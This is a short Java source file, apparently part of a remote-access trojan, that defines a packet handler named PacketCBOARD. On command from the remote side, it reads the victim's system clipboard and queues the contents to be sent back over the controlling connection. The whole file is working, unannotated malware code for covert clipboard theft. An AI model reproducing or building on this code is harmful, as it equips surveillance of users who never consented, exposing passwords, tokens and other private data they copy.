package com.redpois0n.packets.in;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;

import com.redpois0n.Connection;
import com.redpois0n.packets.out.Header;


public class PacketCBOARD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String content = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
		Connection.addToSendQueue(new PacketBuilder(Header.CLIPBOARD, content));
	}

}
